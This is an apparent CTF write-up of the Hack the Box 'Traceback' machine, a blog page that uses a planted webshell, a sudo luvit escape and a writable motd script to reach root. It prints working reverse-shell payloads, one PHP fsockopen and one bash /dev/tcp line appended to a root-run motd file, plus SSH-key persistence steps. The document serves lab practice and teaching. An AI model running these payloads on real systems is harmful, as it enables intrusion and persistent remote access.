@@ -1,0 +1,210 @@
+<!doctype html><html><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>Hack the Box - Traceback - SJG.GG</title><link rel=icon type=image/png href=favicon-32x32.png><meta name=viewport content="width=device-width,initial-scale=1"><link rel=stylesheet href=/css/vendor.min.53c7bddbd93b551bb3fb6792b717e2be973607469877626929aa22dccaf90ae0e0b50f81b469960a4a09706b523e52d205b7a6cc65f00e4a8a5f4df4fff6d951.css integrity="sha512-U8e929k7VRuz+2eStxfivpc2B0aYd2JpKaoi3Mr5CuDgtQ+BtGmWCkoJcGtSPlLSBbemzGXwDkqKX030//bZUQ=="><link id=dark-scheme rel=stylesheet type=text/css href=/css/dark.min.0df0997c5f091a8e57867cce5d4414919687200bd25f8c2e71abd5a5e9cc07ab4f85b956502abcd8d88231382e32823dce39198935eb0295d92db491842a0eba.css integrity="sha512-DfCZfF8JGo5XhnzOXUQUkZaHIAvSX4wucavVpenMB6tPhblWUCq82NiCMTguMoI9zjkZiTXrApXZLbSRhCoOug=="><link id=dark-scheme rel=stylesheet type=text/css href=https://sjg.gg/css/dark.css><script src=https://sjg.gg/js/feather.min.js></script>
+<script src=https://sjg.gg/js/main.js></script></head><body><div class="container wrapper"><div class=header><div class=avatar><a href=https://sjg.gg/><img src=/images/Frank.jpg alt=SJG.GG></a></div><h1 class=site-title><a href=https://sjg.gg/>SJG.GG</a></h1><div class=site-description><p>CTF & Infosec related stuff.</p><nav class="nav social"><ul class=flat><li><a href=/index.xml title=RSS><i data-feather=rss></i></a></li><span class=scheme-toggle><a href=# id=scheme-toggle></a></ul></nav></div><nav class=nav><ul class=flat><li><a href=/>Home</a></li><li><a href=/posts>All posts</a></li><li><a href=/about>About</a></li></ul></nav></div><div class=post><div class=post-header><div class=meta><div class=date><span class=day>04</span>
+<span class=rest>Dec 2022</span></div></div><div class=matter><h1 class=title>Hack the Box - Traceback</h1></div></div><div class=markdown><h2 id=intro>INTRO.</h2><p>Traceback is an easy Linux box that appears to have already been compromised.
+After scanning the site, I found a webshell that I used to gain access as a low-privileged user. This user has sudo access to a program that executes .lua scripts, so I wrote a simple .lua script to gain access as another user. As this user, I discover that the motd file, which displays a message when a user logs in, is writable. I add a reverse shell to this file, which allows me to gain root access to the machine when a user logs in via SSH.</p><h2 id=recon>RECON.</h2><p><code>nmap</code> finds 2 open TCP ports, SSH(22) and HTTP(80)</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo nmap -sC -sV -p- -v -T4 -oA nmap/nmap 10.129.25.78
+</span></span><span class=line><span class=cl><span class=c1>######## SNIP ########</span>
+</span></span><span class=line><span class=cl>PORT   STATE SERVICE VERSION
+</span></span><span class=line><span class=cl>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class=o>(</span>Ubuntu Linux<span class=p>;</span> protocol 2.0<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey: 
+</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>2048</span> 9625518e6c830748ce114b1fe56d8a28 <span class=o>(</span>RSA<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> 54bd467114bdb242a1b6b02d94143b0d <span class=o>(</span>ECDSA<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_  <span class=m>256</span> 4dc3f852b885ec9c3e4d572c4a82fd86 <span class=o>(</span>ED25519<span class=o>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>80/tcp open  http    Apache httpd 2.4.29 <span class=o>((</span>Ubuntu<span class=o>))</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> http-methods: 
+</span></span><span class=line><span class=cl><span class=p>|</span>_  Supported Methods: GET POST OPTIONS HEAD
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Help us
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Apache/2.4.29 <span class=o>(</span>Ubuntu<span class=o>)</span>
+</span></span><span class=line><span class=cl>Service Info: OS: Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span><span class=line><span class=cl><span class=c1>######## SNIP ########</span>
+</span></span></code></pre></div><p><code>OpenSSH</code> on port 22 reveals the host is likely running Ubuntu Bionic(18.04) <a href=https://launchpad.net/ubuntu/+source/openssh/1:7.6p1-4ubuntu0.3>(source)</a><br>Port 80 shows the webserver running <code>Apache httpd 2.4.29</code></p><h3 id=website---tcp-80>Website - TCP 80</h3><p>When I browse to the website, I see that the page has been &ldquo;hacked&rdquo; with mention of a backdoor.<figure><img src=img/WebPage.png><figcaption>Webpage Screenshot</figcaption></figure></p><p>I use <code>gobuster</code> to scan for any other interesting pages.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>gobuster dir -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://10.129.25.78 -o gobuster.txt
+</span></span></code></pre></div><p>Unfortunately nothing was found except an inaccessible <code>/server-status</code> page.</p><p>Remembering the message on the webpage about a backdoor being available, I use a more specific wordlist and was able to successfully find the backdoor.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>gobuster dir -w /usr/share/seclists/Web-Shells/backdoor_list.txt -u http://10.129.25.78
+</span></span><span class=line><span class=cl>/smevk.php            <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 1261<span class=o>]</span>
+</span></span></code></pre></div><p>Browsing to the page reveals a login page for the <code>"SmEvK_PaThAn Shell"</code><figure><img src=img/SmEvK_Login.png><figcaption>Webshell login page.</figcaption></figure></p><p>I try admin:admin and can login!<figure><img src=img/SmEvK_Shell.png><figcaption>SmEvK_Shell.</figcaption></figure></p><p>There are various options available through this shell, and since PHP is available, I decided to upload a reverse shell. Before doing so, I set up a netcat listener on my machine. The reverse shell I used was the following PHP code:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span> <span class=nv>$sock</span><span class=o>=</span><span class=nx>fsockopen</span><span class=p>(</span><span class=s2>&#34;10.10.14.77&#34;</span><span class=p>,</span><span class=mi>9999</span><span class=p>);</span><span class=nv>$proc</span><span class=o>=</span><span class=nx>proc_open</span><span class=p>(</span><span class=s2>&#34;sh&#34;</span><span class=p>,</span> <span class=k>array</span><span class=p>(</span><span class=mi>0</span><span class=o>=&gt;</span><span class=nv>$sock</span><span class=p>,</span> <span class=mi>1</span><span class=o>=&gt;</span><span class=nv>$sock</span><span class=p>,</span> <span class=mi>2</span><span class=o>=&gt;</span><span class=nv>$sock</span><span class=p>),</span><span class=nv>$pipes</span><span class=p>);</span> <span class=cp>?&gt;</span><span class=err>
+</span></span></span></code></pre></div><p>After I uploaded the PHP file, I browsed to it and was able to gain shell access as the webadmin user.<figure><img src=img/Shell_as_webadmin.png><figcaption>Shell as the webadmin user.</figcaption></figure></p><h2 id=shell-as-webadmin>Shell as webadmin</h2><p>Once I had access to the shell, I upgraded it to a more interactive shell with command completion and other features available. This allowed me to more easily navigate the system and run commands.
+<a href=https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/>(Upgrading to fully interactive shell)</a></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ python -c <span class=s1>&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</span></span><span class=line><span class=cl>Ctrl-Z
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>$ stty raw -echo
+</span></span><span class=line><span class=cl>$ <span class=nb>fg</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>$ reset
+</span></span><span class=line><span class=cl>$ <span class=nb>export</span> <span class=nv>SHELL</span><span class=o>=</span>bash
+</span></span><span class=line><span class=cl>$ <span class=nb>export</span> <span class=nv>TERM</span><span class=o>=</span>xterm-256color
+</span></span><span class=line><span class=cl>$ stty rows <span class=m>81</span> columns <span class=m>316</span>
+</span></span></code></pre></div><p>There are 2 users with home directories, webadmin and sysadmin.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>webadmin@traceback:/var/www/html$ ls -lah /home/
+</span></span><span class=line><span class=cl>total 16K
+</span></span><span class=line><span class=cl>drwxr-xr-x  <span class=m>4</span> root     root     4.0K Aug <span class=m>25</span>  <span class=m>2019</span> .
+</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>22</span> root     root     4.0K Apr <span class=m>22</span>  <span class=m>2021</span> ..
+</span></span><span class=line><span class=cl>drwxr-x---  <span class=m>5</span> sysadmin sysadmin 4.0K Mar <span class=m>16</span>  <span class=m>2020</span> sysadmin
+</span></span><span class=line><span class=cl>drwxr-x---  <span class=m>5</span> webadmin sysadmin 4.0K Apr <span class=m>22</span>  <span class=m>2021</span> webadmin
+</span></span><span class=line><span class=cl>webadmin@traceback:/var/www/html$
+</span></span></code></pre></div><p>Webadmin&rsquo;s home directory contains a note from the other user &ldquo;sysadmin&rdquo;</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>webadmin@traceback:/var/www/html$ <span class=nb>cd</span> ~
+</span></span><span class=line><span class=cl>webadmin@traceback:/home/webadmin$ ls -lah
+</span></span><span class=line><span class=cl>total 44K
+</span></span><span class=line><span class=cl>drwxr-x--- <span class=m>5</span> webadmin sysadmin 4.0K Apr <span class=m>22</span>  <span class=m>2021</span> .
+</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>4</span> root     root     4.0K Aug <span class=m>25</span>  <span class=m>2019</span> ..
+</span></span><span class=line><span class=cl>-rw------- <span class=m>1</span> webadmin webadmin  <span class=m>105</span> Mar <span class=m>16</span>  <span class=m>2020</span> .bash_history
+</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> webadmin webadmin  <span class=m>220</span> Aug <span class=m>23</span>  <span class=m>2019</span> .bash_logout
+</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> webadmin webadmin 3.7K Aug <span class=m>23</span>  <span class=m>2019</span> .bashrc
+</span></span><span class=line><span class=cl>drwx------ <span class=m>2</span> webadmin webadmin 4.0K Aug <span class=m>23</span>  <span class=m>2019</span> .cache
+</span></span><span class=line><span class=cl>drwxrwxr-x <span class=m>3</span> webadmin webadmin 4.0K Apr <span class=m>22</span>  <span class=m>2021</span> .local
+</span></span><span class=line><span class=cl>-rw-rw-r-- <span class=m>1</span> webadmin webadmin    <span class=m>1</span> Aug <span class=m>25</span>  <span class=m>2019</span> .luvit_history
+</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> webadmin webadmin  <span class=m>807</span> Aug <span class=m>23</span>  <span class=m>2019</span> .profile
+</span></span><span class=line><span class=cl>drwxrwxr-x <span class=m>2</span> webadmin webadmin 4.0K Feb <span class=m>27</span>  <span class=m>2020</span> .ssh
+</span></span><span class=line><span class=cl>-rw-rw-r-- <span class=m>1</span> sysadmin sysadmin  <span class=m>122</span> Mar <span class=m>16</span>  <span class=m>2020</span> note.txt
+</span></span></code></pre></div><p>Contents of the note.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>webadmin@traceback:/home/webadmin$ cat note.txt 
+</span></span><span class=line><span class=cl>- sysadmin -
+</span></span><span class=line><span class=cl>I have left a tool to practice Lua.
+</span></span><span class=line><span class=cl>I<span class=err>&#39;</span>m sure you know where to find it.
+</span></span><span class=line><span class=cl>Contact me <span class=k>if</span> you have any question.
+</span></span></code></pre></div><p>I then check the contents of .bash_history. This shows that webadmin has previously ran <code>sudo -u sysadmin /home/sysadmin/luvit</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>webadmin@traceback:/home/webadmin$ cat .bash_history 
+</span></span><span class=line><span class=cl>ls -la
+</span></span><span class=line><span class=cl>sudo -l
+</span></span><span class=line><span class=cl>nano privesc.lua
+</span></span><span class="line hl"><span class=cl>sudo -u sysadmin /home/sysadmin/luvit privesc.lua 
+</span></span><span class=line><span class=cl>rm privesc.lua
+</span></span><span class=line><span class=cl><span class=nb>logout</span>
+</span></span></code></pre></div><p>Using <code>sudo -l</code> also confirms this.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>webadmin@traceback:/home/webadmin$ sudo -l
+</span></span><span class=line><span class=cl>Matching Defaults entries <span class=k>for</span> webadmin on traceback:
+</span></span><span class=line><span class=cl>    env_reset, mail_badpass, <span class=nv>secure_path</span><span class=o>=</span>/usr/local/sbin<span class=se>\:</span>/usr/local/bin<span class=se>\:</span>/usr/sbin<span class=se>\:</span>/usr/bin<span class=se>\:</span>/sbin<span class=se>\:</span>/bin<span class=se>\:</span>/snap/bin
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>User webadmin may run the following commands on traceback:
+</span></span><span class="line hl"><span class=cl>    <span class=o>(</span>sysadmin<span class=o>)</span> NOPASSWD: /home/sysadmin/luvit
+</span></span></code></pre></div><p>I do a quick Google search and find that the <code>luvit</code> tool is a scripting platform that can be used to run lua scripts. The website <a href="https://luvit.io/#:~:text=The%20luvit%20CLI%20tool%20can,Hello%20World%20for%20every%20request.">(luvit.io)</a> has more information. Since I have the ability to run programs with elevated privileges using the sudo command, I find examples on <a href=https://gtfobins.github.io/gtfobins/lua/>(gtfobins.github.io)</a> of how this can be abused to gain further access to the system.</p><p>I create a .lua file with the following contents:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>os.execute<span class=o>(</span><span class=s2>&#34;/bin/bash&#34;</span><span class=o>)</span>
+</span></span></code></pre></div><p>Using the <code>sudo</code> command, I run the script as the webadmin user and gain a shell as the sysadmin user.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>webadmin@traceback:/home/webadmin$ sudo -u sysadmin /home/sysadmin/luvit sjg.lua 
+</span></span><span class=line><span class=cl>sysadmin@traceback:/home/webadmin$
+</span></span></code></pre></div><h2 id=shell-as-sysadmin>Shell as Sysadmin</h2><p>In sysadmins home directory I find the user flag.<figure><img src=img/user_txt.png><figcaption>sysadmins home folder.</figcaption></figure></p><p>I check what groups the sysadmin user is a member of. sysadmin is member of the sysadmin group:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sysadmin@traceback:~$ id
+</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>1001<span class=o>(</span>sysadmin<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>1001<span class=o>(</span>sysadmin<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>1001<span class=o>(</span>sysadmin<span class=o>)</span>
+</span></span></code></pre></div><p>I use the find command to search for files that are writable by the sysadmin group and are not located in the /proc directory, which contains many writable files:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sysadmin@traceback:~$ find / -type f -group sysadmin -perm -g<span class=o>=</span>w -not -path <span class=s1>&#39;/proc/*&#39;</span> 2&gt;/dev/null
+</span></span><span class=line><span class=cl>/etc/update-motd.d/50-motd-news
+</span></span><span class=line><span class=cl>/etc/update-motd.d/10-help-text
+</span></span><span class=line><span class=cl>/etc/update-motd.d/91-release-upgrade
+</span></span><span class=line><span class=cl>/etc/update-motd.d/00-header
+</span></span><span class=line><span class=cl>/etc/update-motd.d/80-esm
+</span></span><span class=line><span class=cl>/home/sysadmin/luvit
+</span></span><span class=line><span class=cl>/home/webadmin/note.txt
+</span></span></code></pre></div><p>This lists several files that are writable by the sysadmin group, including the /etc/update-motd.d directory.
+Checking the permissions with <code>ls</code> confirms this:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sysadmin@traceback:~$ ls -lah /etc/update-motd.d/
+</span></span><span class=line><span class=cl>total 32K
+</span></span><span class=line><span class=cl>drwxr-xr-x  <span class=m>2</span> root sysadmin 4.0K Apr <span class=m>22</span>  <span class=m>2021</span> .
+</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>80</span> root root     4.0K Apr <span class=m>22</span>  <span class=m>2021</span> ..
+</span></span><span class=line><span class=cl>-rwxrwxr-x  <span class=m>1</span> root sysadmin  <span class=m>981</span> Dec <span class=m>11</span> 03:33 00-header
+</span></span><span class=line><span class=cl>-rwxrwxr-x  <span class=m>1</span> root sysadmin  <span class=m>982</span> Dec <span class=m>11</span> 03:33 10-help-text
+</span></span><span class=line><span class=cl>-rwxrwxr-x  <span class=m>1</span> root sysadmin 4.2K Dec <span class=m>11</span> 03:33 50-motd-news
+</span></span><span class=line><span class=cl>-rwxrwxr-x  <span class=m>1</span> root sysadmin  <span class=m>604</span> Dec <span class=m>11</span> 03:33 80-esm
+</span></span><span class=line><span class=cl>-rwxrwxr-x  <span class=m>1</span> root sysadmin  <span class=m>299</span> Dec <span class=m>11</span> 03:33 91-release-upgrade
+</span></span></code></pre></div><p>The /etc/update-motd.d directory is writable by the sysadmin group, which we are a member of. In Linux, the motd (message of the day) is a message that is displayed to users after they log in to the system. The motd is typically displayed on the login screen, and it can be used to display information such as system updates, news, or announcements.</p><p>I think that, since we have permission to write, I can add a reverse shell to one of the motd files. However, I will need to be able to log in using SSH first. The sshd_config file indicates that I can use public key authentication to log in, so I should be able to create a key to use for this purpose.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>cat /etc/ssh/sshd_config
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>######## SNIP ########</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Authentication:</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>#LoginGraceTime 2m</span>
+</span></span><span class=line><span class=cl><span class=c1>#PermitRootLogin prohibit-password</span>
+</span></span><span class=line><span class=cl><span class=c1>#StrictModes yes</span>
+</span></span><span class=line><span class=cl><span class=c1>#MaxAuthTries 3</span>
+</span></span><span class=line><span class=cl><span class=c1>#MaxSessions 10</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class="line hl"><span class=cl>PubkeyAuthentication yes
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Expect .ssh/authorized_keys2 to be disregarded by default in future.</span>
+</span></span><span class=line><span class=cl>AuthorizedKeysFile      .ssh/authorized_keys .ssh/authorized_keys2
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>######## SNIP ########</span>
+</span></span></code></pre></div><p>I am unable to create a key for the sysadmin user because the .ssh folder is owned by root. On the other hand, the .ssh folder for the &lsquo;webadmin&rsquo; user has the correct permissions, so I should be able to create a key for that user.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sysadmin@traceback:~$ ls -lah
+</span></span><span class=line><span class=cl>total 5.1M
+</span></span><span class=line><span class=cl>drwxr-x--- <span class=m>5</span> sysadmin sysadmin 4.0K Dec <span class=m>11</span> 03:43 .
+</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>4</span> root     root     4.0K Aug <span class=m>25</span>  <span class=m>2019</span> ..
+</span></span><span class=line><span class=cl>-rw------- <span class=m>1</span> sysadmin sysadmin    <span class=m>6</span> Dec <span class=m>11</span> 02:47 .bash_history
+</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> sysadmin sysadmin  <span class=m>220</span> Apr  <span class=m>4</span>  <span class=m>2018</span> .bash_logout
+</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> sysadmin sysadmin 3.7K Apr  <span class=m>4</span>  <span class=m>2018</span> .bashrc
+</span></span><span class=line><span class=cl>drwx------ <span class=m>2</span> sysadmin sysadmin 4.0K Aug <span class=m>25</span>  <span class=m>2019</span> .cache
+</span></span><span class=line><span class=cl>-rw------- <span class=m>1</span> sysadmin sysadmin   <span class=m>35</span> Dec <span class=m>11</span> 03:43 .lesshst
+</span></span><span class=line><span class=cl>drwxrwxr-x <span class=m>3</span> sysadmin sysadmin 4.0K Aug <span class=m>24</span>  <span class=m>2019</span> .local
+</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> sysadmin sysadmin   <span class=m>13</span> Dec <span class=m>11</span> 02:50 .luvit_history
+</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> sysadmin sysadmin  <span class=m>807</span> Apr  <span class=m>4</span>  <span class=m>2018</span> .profile
+</span></span><span class="line hl"><span class=cl>drwxr-xr-x <span class=m>2</span> root     root     4.0K Apr <span class=m>20</span>  <span class=m>2021</span> .ssh
+</span></span><span class=line><span class=cl>-rwxrwxr-x <span class=m>1</span> sysadmin sysadmin 4.2M Aug <span class=m>24</span>  <span class=m>2019</span> luvit
+</span></span><span class=line><span class=cl>-rw------- <span class=m>1</span> sysadmin sysadmin   <span class=m>33</span> Dec <span class=m>10</span> 08:04 user.txt
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>sysadmin@traceback:~$ ls -lah /home/webadmin/
+</span></span><span class=line><span class=cl>total 48K
+</span></span><span class=line><span class=cl>drwxr-x--- <span class=m>5</span> webadmin sysadmin 4.0K Dec <span class=m>11</span> 02:46 .
+</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>4</span> root     root     4.0K Aug <span class=m>25</span>  <span class=m>2019</span> ..
+</span></span><span class=line><span class=cl>-rw------- <span class=m>1</span> webadmin webadmin  <span class=m>105</span> Mar <span class=m>16</span>  <span class=m>2020</span> .bash_history
+</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> webadmin webadmin  <span class=m>220</span> Aug <span class=m>23</span>  <span class=m>2019</span> .bash_logout
+</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> webadmin webadmin 3.7K Aug <span class=m>23</span>  <span class=m>2019</span> .bashrc
+</span></span><span class=line><span class=cl>drwx------ <span class=m>2</span> webadmin webadmin 4.0K Aug <span class=m>23</span>  <span class=m>2019</span> .cache
+</span></span><span class=line><span class=cl>drwxrwxr-x <span class=m>3</span> webadmin webadmin 4.0K Apr <span class=m>22</span>  <span class=m>2021</span> .local
+</span></span><span class=line><span class=cl>-rw-rw-r-- <span class=m>1</span> webadmin webadmin    <span class=m>1</span> Aug <span class=m>25</span>  <span class=m>2019</span> .luvit_history
+</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> webadmin webadmin  <span class=m>807</span> Aug <span class=m>23</span>  <span class=m>2019</span> .profile
+</span></span><span class="line hl"><span class=cl>drwxrwxr-x <span class=m>2</span> webadmin webadmin 4.0K Feb <span class=m>27</span>  <span class=m>2020</span> .ssh
+</span></span><span class=line><span class=cl>-rw-rw-r-- <span class=m>1</span> sysadmin sysadmin  <span class=m>122</span> Mar <span class=m>16</span>  <span class=m>2020</span> note.txt
+</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> webadmin webadmin   <span class=m>24</span> Dec <span class=m>11</span> 02:46 sjg.lua
+</span></span></code></pre></div><p>On my kali box I setup the keys, ready to be copied to the traceback machine, making sure to also set the correct permissions for the id_rsa key:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>steve@sponge<span class=o>)</span>-<span class=o>[</span>~/htb/Traceback<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ ssh-keygen              
+</span></span><span class=line><span class=cl>Generating public/private rsa key pair.
+</span></span><span class=line><span class=cl>Enter file in which to save the key <span class=o>(</span>/home/steve/.ssh/id_rsa<span class=o>)</span>: /home/steve/htb/Traceback/id_rsa
+</span></span><span class=line><span class=cl>Enter passphrase <span class=o>(</span>empty <span class=k>for</span> no passphrase<span class=o>)</span>: 
+</span></span><span class=line><span class=cl>Enter same passphrase again: 
+</span></span><span class=line><span class=cl>Your identification has been saved in /home/steve/htb/Traceback/id_rsa
+</span></span><span class=line><span class=cl>Your public key has been saved in /home/steve/htb/Traceback/id_rsa.pub
+</span></span><span class=line><span class=cl>The key fingerprint is:
+</span></span><span class=line><span class=cl>SHA256:AczlyxEPmPaKmpxD7EVnfVNTbV9etsdTjejsTFeep7Y steve@sponge
+</span></span><span class=line><span class=cl>The key<span class=err>&#39;</span>s randomart image is:
+</span></span><span class=line><span class=cl>+---<span class=o>[</span>RSA 3072<span class=o>]</span>----+
+</span></span><span class=line><span class=cl><span class=p>|</span>     o.++    o.o.<span class=p>|</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>      *o +  + . X<span class=p>|</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>     . o+ .+ . BB<span class=p>|</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>    . o.o+o + .+B<span class=p>|</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> . . + .S. <span class=o>=</span> . .+<span class=p>|</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>  o o .     o o  <span class=p>|</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> + <span class=o>=</span>         . . <span class=p>|</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>  B           E  <span class=p>|</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>   .             <span class=p>|</span>
+</span></span><span class=line><span class=cl>+----<span class=o>[</span>SHA256<span class=o>]</span>-----+
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>┌──<span class=o>(</span>steve@sponge<span class=o>)</span>-<span class=o>[</span>~/htb/Traceback<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ chmod <span class=m>600</span> id_rsa                        
+</span></span><span class=line><span class=cl>                                                                                                                                                                                                                                                                                                                            
+</span></span><span class=line><span class=cl>┌──<span class=o>(</span>steve@sponge<span class=o>)</span>-<span class=o>[</span>~/htb/Traceback<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ cat id_rsa.pub  
+</span></span><span class=line><span class=cl>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCSge1wgWkTpC <span class=c1>#### SNIP #### 7FimWkz8= steve@sponge</span>
+</span></span></code></pre></div><p>I copy the key to the clipboard and then switch back to the webadmin user on Traceback. From there, I can add the key to the authorized_keys file. This should allow me to log in using the key.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>webadmin@traceback:~$ <span class=nb>echo</span> <span class=s2>&#34;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCSge1wgWkTpC ######## SNIP ######## | cat &gt;&gt; ~/.ssh/authorized_keys
+</span></span></span></code></pre></div><p>With the key I created, I am now able to log in as the webadmin user using SSH. When I log in, I see the message of the day (motd), which also mentions that the machine has been hacked.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>	┌──<span class=o>(</span>steve@sponge<span class=o>)</span>-<span class=o>[</span>~/htb/Traceback<span class=o>]</span>
+</span></span><span class=line><span class=cl>	└─$ ssh -i id_rsa webadmin@10.129.25.78
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>	<span class=c1>#################################</span>
+</span></span><span class=line><span class=cl>	-------- OWNED BY XH4H  ---------
+</span></span><span class=line><span class=cl>	- I guess stuff could have been configured better ^^ -
+</span></span><span class=line><span class=cl>	<span class=c1>#################################</span>
+</span></span><span class=line><span class=cl>	
+</span></span><span class=line><span class=cl>	Welcome to Xh4H land 
+</span></span><span class=line><span class=cl>	
+</span></span><span class=line><span class=cl>	
+</span></span><span class=line><span class=cl>Last login: Thu Feb <span class=m>27</span> 06:29:02 <span class=m>2020</span> from 10.10.14.3
+</span></span></code></pre></div><p>I use the lua file that I created earlier to escalate my privileges back to the sysadmin user.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo -u sysadmin /home/sysadmin/luvit sjg.lua
+</span></span></code></pre></div><p>I am now able to edit the <code>/etc/update-motd.d/00-header</code> file and add a reverse shell to it.</p><p>To do this, I use the echo command to append the reverse shell to the file.<br>To verify that the reverse shell has been added to the file, I use the tail command to view the last few lines of the file:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.77/9999 0&gt;&amp;1&#39;&#34;</span> &gt;&gt; /etc/update-motd.d/00-header
+</span></span><span class=line><span class=cl>tail /etc/update-motd.d/00-header
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>#</span>
+</span></span><span class=line><span class=cl><span class=c1>#    You should have received a copy of the GNU General Public License along</span>
+</span></span><span class=line><span class=cl><span class=c1>#    with this program; if not, write to the Free Software Foundation, Inc.,</span>
+</span></span><span class=line><span class=cl><span class=c1>#    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>[</span> -r /etc/lsb-release <span class=o>]</span> <span class=o>&amp;&amp;</span> . /etc/lsb-release
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;\nWelcome to Xh4H land \n&#34;</span>
+</span></span><span class="line hl"><span class=cl>bash -c <span class=s1>&#39;bash -i &gt;&amp; /dev/tcp/10.10.14.77/9999 0&gt;&amp;1&#39;</span>
